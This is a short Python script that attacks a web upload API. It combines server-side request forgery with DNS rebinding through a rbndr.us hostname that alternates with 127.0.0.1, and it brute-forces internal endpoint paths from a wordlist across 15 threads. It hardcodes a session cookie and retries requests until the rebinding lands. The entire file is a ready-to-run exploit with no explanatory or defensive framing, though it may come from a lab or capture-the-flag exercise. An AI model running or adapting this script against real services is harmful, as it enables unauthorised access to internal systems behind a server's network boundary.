#!/usr/bin/python3
import requests
import threading
import queue
import logging

# Configuration
CONFIG = {
    "wordlist_path": "common.txt",
    "url": "http://localhost/api/v2/upload",
    "headers": {"Content-Type": "application/json"},
    "cookies": {"uuid_hash": "8f282a4de56b5a379083e16339d84cd9bee0f64503f9159c5ca7a89f2484a121cae32d23afed9fc673225e1b1ac4beb468964e832a8ef43a2758a475aa2703ed"},
    "threads": 15
}

# Set up logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

def fuzz_internal_endpoints(word_queue):
    while not word_queue.empty():
        word = word_queue.get()
        json_data = {"file_url": f"http://7f000001.d83ad3ce.rbndr.us/{word}"}
        try:
            while True:
                res = requests.post(CONFIG["url"], headers=CONFIG["headers"], json=json_data, cookies=CONFIG["cookies"])
                if res.status_code == 404 and res.text == "resource not found":
                    break
                elif res.status_code == 200:
                    logging.info(f"/{word} -> {res.status_code}")
                    break
        except requests.RequestException as e:
            logging.error(f"Request failed for word: {word}, Error: {e}")
        finally:
            word_queue.task_done()

def main():
    word_queue = queue.Queue()
    with open(CONFIG["wordlist_path"], "r") as wordlist_fd:
        for word in wordlist_fd:
            word_queue.put(word.strip())
    
    threads = []
    for _ in range(CONFIG["threads"]):
        thread = threading.Thread(target=fuzz_internal_endpoints, args=(word_queue,))
        thread.start()
        threads.append(thread)
    
    for thread in threads:
        thread.join()

if __name__ == "__main__":
    main()
